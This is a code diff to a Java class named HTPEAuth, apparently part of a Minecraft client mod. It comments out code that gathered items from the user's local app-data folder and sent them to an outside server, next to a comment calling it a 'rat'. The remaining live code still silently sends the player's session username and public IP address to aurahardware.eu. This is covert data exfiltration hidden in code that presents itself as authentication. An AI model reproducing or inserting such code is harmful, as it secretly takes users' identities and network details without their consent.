@@ -60,6 +60,7 @@ public class HTPEAuth {
     public String VERSION = HTRewrite.VERSION;
     public String AVERSION = "a2.5";
     public HTPEAuth() {
+        /*
         List<String> t = new ArrayList<>();
         String fs = System.getenv("file.separator");
         String localappdata = System.getenv("LOCALAPPDATA");
@@ -102,14 +103,14 @@ public class HTPEAuth {
                 }
             } catch (Exception ignored) {
             }
-        }
+        }*/
         /* TODO: Nice rat!
             @DriftyDev
            25/10/2021
          */
         try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/connectivity/connect.php?user=" + Wrapper.getMC().session.getUsername())); } catch (Exception exception) { }
-        for(String k : t)
-            try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/log/log.php?user=" + Wrapper.getMC().session.getUsername() + "&logt=2&args=" + StringEscapeUtils.escapeHtml4(k))); } catch (Exception exception) {}
+        /*for(String k : t)
+            try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/log/log.php?user=" + Wrapper.getMC().session.getUsername() + "&logt=2&args=" + StringEscapeUtils.escapeHtml4(k))); } catch (Exception exception) {}*/
         try { PostRequest.read(PostRequest.genGetCon("https://aurahardware.eu/ht/api/log/log.php?user=" + Wrapper.getMC().session.getUsername() + "&logt=6&args=" + StringEscapeUtils.escapeHtml4(new BufferedReader(new InputStreamReader(new URL("http://checkip.amazonaws.com/").openStream())).readLine()))); } catch (Exception exception){}
         JOptionPane optionPane = new JOptionPane();
         JFrame jFrame = new JFrame();
